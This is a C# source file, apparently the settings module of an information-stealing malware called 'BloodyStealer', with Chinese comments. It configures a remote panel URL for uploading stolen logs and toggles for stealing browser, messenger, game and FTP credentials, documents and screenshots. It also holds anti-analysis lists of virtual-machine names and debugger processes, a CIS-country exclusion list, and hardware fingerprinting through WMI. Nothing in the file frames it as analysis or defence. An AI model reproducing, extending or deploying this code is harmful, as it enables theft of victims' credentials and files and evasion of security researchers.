using System;
using System.IO;
using System.Net;
using System.Text;
using System.Management;
using System.Security.Cryptography;

namespace BloodyStealer
{
    /// <summary>
    /// 管理程序的所有设置和配置参数
    /// </summary>
    internal static class Settings
    {
        // 服务器配置
        public static string ServerUrl { get; private set; } = "https://panel.bloodypanel.com/api/logs";
        public static string AESKey { get; private set; } = "b1o0dystea1erKey"; // 用于加密的密钥
        public static string HWID { get; private set; } // 硬件ID

        // 客户端识别信息
        public static string Id { get; private set; } // 唯一ID
        public static string BuildName { get; private set; } = "BloodyStealer"; // 构建名称
        
        // 控制标志
        public static bool EnableAntiAnalysis { get; set; } = true; // 是否启用反分析
        public static bool EnableEncryption { get; set; } = true;   // 是否启用加密
        public static bool SelfDestruct { get; set; } = false;      // 是否在执行后自毁
        
        // 窃取内容控制
        public static bool StealBrowsers { get; set; } = true;      // 是否窃取浏览器数据
        public static bool StealGames { get; set; } = true;         // 是否窃取游戏数据
        public static bool StealMessengers { get; set; } = true;    // 是否窃取即时通讯数据
        public static bool StealFTP { get; set; } = true;           // 是否窃取FTP客户端数据
        public static bool StealFiles { get; set; } = true;         // 是否窃取敏感文件
        public static bool CaptureScreenshot { get; set; } = true;  // 是否截取屏幕截图
        
        // 连接设置
        public static int MaxRetries { get; set; } = 3;             // 连接重试次数
        public static int ConnectionTimeout { get; set; } = 30000;  // 连接超时时间(毫秒)
        
        // 文件设置
        public static string[] FileTypes { get; private set; } = new string[] { ".txt", ".doc", ".docx", ".pdf" };
        public static int MaxFileSize { get; private set; } = 3 * 1024 * 1024; // 3MB
        public static int MaxCountFiles { get; private set; } = 10;

        // 防分析设置
        public static string[] VmNames { get; private set; } = new string[]
        {
            "VMware",
            "Xen",
            "QEMU",
            "Virtual",
            "VBox",
            "Sandbox",
            "Sand-Box",
            "Parallels",
            "Microsoft Virtual",
            "Hyper-V",
            "KVM",
            "Bochs",
            "Oracle"
        };

        public static string[] BadProcesses { get; private set; } = new string[]
        {
            "ProcessHacker",
            "pestudio",
            "procmon",
            "dumpcap",
            "HookExplorer",
            "ImportREC",
            "PETools",
            "LordPE",
            "SysInspector",
            "proc_analyzer",
            "sysAnalyzer",
            "sniff_hit",
            "windbg",
            "ImmunityDebugger"
        };

        public static string[] CisCountries { get; private set; } = new string[]
        {
            "RU", // 俄罗斯
            "BY", // 白俄罗斯
            "KZ", // 哈萨克斯坦
            "UA", // 乌克兰
            "UZ", // 乌兹别克斯坦
            "AM", // 亚美尼亚
            "AZ", // 阿塞拜疆
            "KG", // 吉尔吉斯斯坦
            "MD", // 摩尔多瓦
            "TJ"  // 塔吉克斯坦
        };

        // 防重复运行设置
        public static string[] AntiRepeatDirectories { get; private set; } = new string[]
        {
            "AppData\\Local\\Temp",
            "AppData\\Roaming\\Temp"
        };

        /// <summary>
        /// 初始化设置
        /// </summary>
        public static void Initialize()
        {
            // 生成唯一ID
            HWID = GetHardwareID();
            Id = GenerateUniqueId();
            
            // 配置网络设置
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.DefaultConnectionLimit = 10;
        }
        
        /// <summary>
        /// 获取硬件ID
        /// </summary>
        /// <returns>硬件ID字符串</returns>
        private static string GetHardwareID()
        {
            try
            {
                string cpuId = GetCpuId();
                string diskId = GetDiskId();
                string macAddress = GetMacAddress();
                
                // 组合硬件信息
                string hwid = $"{cpuId}|{diskId}|{macAddress}";
                
                // 计算MD5哈希作为硬件ID
                using (MD5 md5 = MD5.Create())
                {
                    byte[] hashBytes = md5.ComputeHash(Encoding.UTF8.GetBytes(hwid));
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hashBytes.Length; i++)
                    {
                        sb.Append(hashBytes[i].ToString("x2"));
                    }
                    return sb.ToString();
                }
            }
            catch
            {
                // 如果获取硬件ID失败，生成一个随机ID
                return Guid.NewGuid().ToString("N");
            }
        }
        
        /// <summary>
        /// 生成唯一客户端ID
        /// </summary>
        /// <returns>唯一客户端ID字符串</returns>
        private static string GenerateUniqueId()
        {
            try
            {
                string username = Environment.UserName;
                string machineName = Environment.MachineName;
                string os = Environment.OSVersion.ToString();
                
                // 组合系统信息
                string uniqueInfo = $"{username}|{machineName}|{os}|{HWID}";
                
                // 计算SHA1哈希作为唯一ID
                using (SHA1 sha1 = SHA1.Create())
                {
                    byte[] hashBytes = sha1.ComputeHash(Encoding.UTF8.GetBytes(uniqueInfo));
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hashBytes.Length; i++)
                    {
                        sb.Append(hashBytes[i].ToString("x2"));
                    }
                    return sb.ToString().Substring(0, 16);
                }
            }
            catch
            {
                // 如果生成唯一ID失败，使用一个随机GUID
                return Guid.NewGuid().ToString("N").Substring(0, 16);
            }
        }
        
        /// <summary>
        /// 获取CPU ID
        /// </summary>
        /// <returns>CPU ID字符串</returns>
        private static string GetCpuId()
        {
            try
            {
                using (ManagementClass mc = new ManagementClass("Win32_Processor"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        return mo["ProcessorId"]?.ToString() ?? string.Empty;
                    }
                }
            }
            catch
            {
                // 忽略错误
            }
            return string.Empty;
        }
        
        /// <summary>
        /// 获取硬盘ID
        /// </summary>
        /// <returns>硬盘ID字符串</returns>
        private static string GetDiskId()
        {
            try
            {
                using (ManagementClass mc = new ManagementClass("Win32_DiskDrive"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        return mo["SerialNumber"]?.ToString() ?? string.Empty;
                    }
                }
            }
            catch
            {
                // 忽略错误
            }
            return string.Empty;
        }
        
        /// <summary>
        /// 获取MAC地址
        /// </summary>
        /// <returns>MAC地址字符串</returns>
        private static string GetMacAddress()
        {
            try
            {
                using (ManagementClass mc = new ManagementClass("Win32_NetworkAdapterConfiguration"))
                using (ManagementObjectCollection moc = mc.GetInstances())
                {
                    foreach (ManagementObject mo in moc)
                    {
                        if ((bool)mo["IPEnabled"])
                        {
                            return mo["MacAddress"]?.ToString() ?? string.Empty;
                        }
                    }
                }
            }
            catch
            {
                // 忽略错误
            }
            return string.Empty;
        }
    }
} 